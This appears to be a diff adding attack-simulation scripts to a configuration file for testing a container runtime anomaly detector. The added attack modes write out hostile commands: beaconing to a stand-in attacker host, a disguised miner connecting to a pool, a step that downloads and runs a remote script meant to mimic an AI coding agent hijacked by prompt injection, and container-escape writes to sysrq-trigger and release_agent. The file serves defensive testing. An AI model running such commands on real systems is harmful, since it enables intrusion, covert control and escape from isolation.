@@ -253,3 +253,85 @@ data:
       wget -q -T 3 -O /dev/null http://203.0.113.9/key 2>/dev/null
     fi
     echo MAINTAINED
+  beacon.sh: |
+    # S9 C2 信标:基线周期内部健康检查;攻击叠加固定节奏外联 beacon
+    MODE="${1:-baseline}"
+    mkdir -p /workspace
+    echo ok > /workspace/status
+    N=25; [ "$MODE" = attack ] && N=12
+    i=0
+    while [ $i -lt $N ]; do
+      wget -q -T 2 -O /dev/null http://10.96.0.1/healthz 2>/dev/null
+      cat /workspace/status > /dev/null
+      if [ "$MODE" = attack ]; then
+        wget -q -T 2 -O /dev/null http://203.0.113.9:8443/beacon 2>/dev/null
+      fi
+      i=$((i+1)); sleep 2
+    done
+    echo scenario-done
+  mining.sh: |
+    # S10 挖矿:基线短驻作业;攻击 xmrig 长驻 + 矿池外联(TeamTNT/Kinsing 模式)
+    MODE="${1:-baseline}"
+    mkdir -p /workspace
+    echo job > /workspace/job.dat
+    N=25; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      sh -c "cat /workspace/job.dat" > /dev/null
+      tar czf /tmp/job.tar.gz /workspace 2>/dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      cp /bin/busybox /tmp/xmrig
+      /tmp/xmrig sh -c 'j=0; while [ $j -lt 60 ]; do sleep 1; j=$((j+1)); done' &
+      sh -c "nc -w 2 203.0.113.9 3333 < /dev/null" 2>/dev/null
+      sleep 30   # 保持 xmrig 长驻超出采集窗口(生命周期偏离)
+    fi
+    echo scenario-done
+  inject.sh: |
+    # S12 提示注入运行时足迹:基线 coding;攻击中途突变拉外部脚本执行
+    # (不采集/不分析 prompt——只检测行为偏离,守 v1.0 边界)
+    MODE="${1:-baseline}"
+    mkdir -p /workspace/src
+    N=25; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      echo "print('hello')" > /workspace/src/main.py
+      cat /workspace/src/main.py > /dev/null
+      sh -c "ls /workspace/src" > /dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      sh -c "wget -q -T 3 -O /tmp/.s http://203.0.113.9/s 2>/dev/null; sh /tmp/.s" 2>/dev/null
+      i=0
+      while [ $i -lt 5 ]; do
+        cat /workspace/src/main.py > /dev/null
+        i=$((i+1)); sleep 1
+      done
+    fi
+    echo scenario-done
+  escape.sh: |
+    # S17 容器逃逸尝试:写 sysrq/release_agent + nsenter(CVE-2022-0185/TeamTNT 模式)
+    # 内核会拒绝,但 openat/exec 尝试可观测——检测意图
+    MODE="${1:-baseline}"
+    N=25; [ "$MODE" = attack ] && N=10
+    i=0
+    while [ $i -lt $N ]; do
+      cat /etc/hosts > /dev/null
+      ls /var/log > /dev/null
+      wget -q -T 2 -O /dev/null http://10.96.0.1/healthz 2>/dev/null
+      i=$((i+1)); sleep 1
+    done
+    if [ "$MODE" = attack ]; then
+      cat /proc/1/cgroup 2>/dev/null
+      echo b > /proc/sysrq-trigger 2>/dev/null
+      echo x > /sys/fs/cgroup/release_agent 2>/dev/null
+      cp /bin/busybox /tmp/nsenter
+      /tmp/nsenter true 2>/dev/null
+      i=0
+      while [ $i -lt 5 ]; do
+        cat /etc/hosts > /dev/null
+        i=$((i+1)); sleep 1
+      done
+    fi
+    echo scenario-done
